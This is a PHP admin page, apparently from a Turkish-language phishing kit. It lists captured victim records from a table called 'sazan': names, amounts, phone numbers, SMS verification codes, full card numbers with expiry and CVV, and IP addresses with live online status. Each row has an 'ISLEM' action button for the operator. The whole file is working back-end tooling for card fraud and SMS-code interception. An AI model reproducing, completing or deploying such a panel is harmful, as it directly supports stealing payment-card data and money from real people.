<?php
include('./config.php'); 
ini_set('display_errors', 0);

if(isset($_GET['admin'])){
	try {
		$result = $mysqli->query("SELECT * FROM sazan ORDER BY id DESC");

		if ($result->num_rows > 0) {
			while ($row = $result->fetch_assoc()) {
				$ip = htmlspecialchars($row['ip']);
				$uniqueId = 'dropdown-' . htmlspecialchars($row['id']);
				echo '

			   <tr>
		<td style="color: lightgreen;">' . htmlspecialchars($row['id']) . '</td>
		 <td style="color: lightgreen;max-width: 45px;font-size: 14px;font-weight: 400;font-style: normal;">' . htmlspecialchars($row['date']) . '</td>

		<td style="color: #28FF0F;">' . htmlspecialchars($row['ad']) . '</td>
		<td style="color: #28FF0F;">' . htmlspecialchars($row['money']) . '</td>
		<td style="color: #28FF0F;max-width: 70px;" >' . htmlspecialchars($row['phone']) . '</td>
		<td style="color: #28FF0F;">' . htmlspecialchars($row['sms']) . '</td>
		<td style="color: #28FF0F;">'; if(isset($row['kk'])){ echo htmlspecialchars($row['kk']) . ' | ' . htmlspecialchars($row['ay']) . '/' . htmlspecialchars($row['yil']) . ' |' . htmlspecialchars($row['cvv']);} echo ' </td>
		<td style="color: #aaaaaa; font-size: 16px; text-align: center;max-width: 80px">' . htmlspecialchars($row['ip']) . ($row['lastOnline'] > time() ? '🟢' : '🔴') . '</td>
		 <td style="color: lightgreen; text-transform: uppercase;max-width: 60px;">' . htmlspecialchars($row['now']) . '</td>
	   <td class="text-end" style="max-width: 70px;">
						<a href="#" class="btn btn-sm btn-warning btn-flex btn-center btn-active-light-primary sweetalert-button" data-ip="' . $ip . '" style="  color: #ffffff;
	  font-weight: 700;
	  font-style: normal;
	  text-transform: uppercase;width: 95%;">
						   <i class="fa-solid fa-bolt"></i> ISLEM

						</a>
					</td>
	</tr>';
			} 
		} else {
			echo '<tr><td colspan="8">Veri bulunamadÄ±.</td></tr>';
		}
	} catch (Exception $e) {
		echo 'Hata: ' . $e->getMessage();
	}
	$mysqli->close();
}